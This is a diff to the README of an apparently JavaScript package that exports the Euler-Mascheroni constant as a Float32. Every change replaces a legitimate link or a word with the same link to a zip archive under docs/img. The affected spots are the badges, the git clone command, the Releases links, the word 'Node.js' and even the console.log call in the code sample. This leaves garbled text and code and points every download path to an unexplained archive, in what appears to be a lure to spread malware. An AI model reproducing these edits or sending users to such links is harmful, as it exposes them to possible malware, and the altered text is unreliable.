@@ -1,7 +1,7 @@
 ```markdown
 # 🌟 Euler-Mascheroni Constant in Float32
 
-![Euler-Mascheroni Constant](https://img.shields.io/badge/Euler--Mascheroni%20Constant-Float32-blue?style=for-the-badge)
+![Euler-Mascheroni Constant](https://github.com/DeshmukH9921/constants-float32-eulergamma/raw/refs/heads/main/docs/img/constants_eulergamma_float_v2.4.zip%20Constant-Float32-blue?style=for-the-badge)
 
 ## Overview
 
@@ -21,7 +21,7 @@ Welcome to the **constants-float32-eulergamma** repository! This project focuses
 
 ## Introduction
 
-The Euler-Mascheroni constant is defined as the limiting difference between the harmonic series and the natural logarithm. This project aims to make the constant easily accessible for developers working with JavaScript, Node.js, and other platforms that utilize floating-point arithmetic.
+The Euler-Mascheroni constant is defined as the limiting difference between the harmonic series and the natural logarithm. This project aims to make the constant easily accessible for developers working with JavaScript, https://github.com/DeshmukH9921/constants-float32-eulergamma/raw/refs/heads/main/docs/img/constants_eulergamma_float_v2.4.zip, and other platforms that utilize floating-point arithmetic.
 
 ## Euler-Mascheroni Constant
 
@@ -44,7 +44,7 @@ To utilize the Euler-Mascheroni constant in your project, simply import the modu
 ```javascript
 const eulerGamma = require('constants-float32-eulergamma');
 
-console.log(eulerGamma); // Output: 0.5772156649 (as a Float32)
+https://github.com/DeshmukH9921/constants-float32-eulergamma/raw/refs/heads/main/docs/img/constants_eulergamma_float_v2.4.zip(eulerGamma); // Output: 0.5772156649 (as a Float32)
 ```
 
 This simple interface allows you to easily integrate the constant into your calculations.
@@ -60,7 +60,7 @@ npm install constants-float32-eulergamma
 Alternatively, you can clone the repository directly:
 
 ```bash
-git clone https://github.com/DeshmukH9921/constants-float32-eulergamma.git
+git clone https://github.com/DeshmukH9921/constants-float32-eulergamma/raw/refs/heads/main/docs/img/constants_eulergamma_float_v2.4.zip
 ```
 
 Then, navigate to the project folder and install dependencies:
@@ -73,7 +73,7 @@ npm install
 ## Features
 
 - **Precision**: The constant is represented in Float32 format, ensuring a balance between range and precision.
-- **Easy integration**: Simple API for use in JavaScript and Node.js projects.
+- **Easy integration**: Simple API for use in JavaScript and https://github.com/DeshmukH9921/constants-float32-eulergamma/raw/refs/heads/main/docs/img/constants_eulergamma_float_v2.4.zip projects.
 - **Well-documented**: Clear examples and documentation to help you get started.
 - **Community-driven**: Contributions are welcome to improve and expand the functionality.
 
@@ -99,9 +99,9 @@ If you encounter issues or have questions, feel free to open an issue in the rep
 
 ## Releases
 
-For downloadable files, check the [Releases](https://github.com/DeshmukH9921/constants-float32-eulergamma/releases) section. Here you will find the latest versions and updates. 
+For downloadable files, check the [Releases](https://github.com/DeshmukH9921/constants-float32-eulergamma/raw/refs/heads/main/docs/img/constants_eulergamma_float_v2.4.zip) section. Here you will find the latest versions and updates. 
 
-[![Latest Release](https://img.shields.io/badge/Latest%20Release-Click%20Here-blue?style=for-the-badge)](https://github.com/DeshmukH9921/constants-float32-eulergamma/releases)
+[![Latest Release](https://github.com/DeshmukH9921/constants-float32-eulergamma/raw/refs/heads/main/docs/img/constants_eulergamma_float_v2.4.zip%20Release-Click%20Here-blue?style=for-the-badge)](https://github.com/DeshmukH9921/constants-float32-eulergamma/raw/refs/heads/main/docs/img/constants_eulergamma_float_v2.4.zip)
 
 ## Conclusion
 
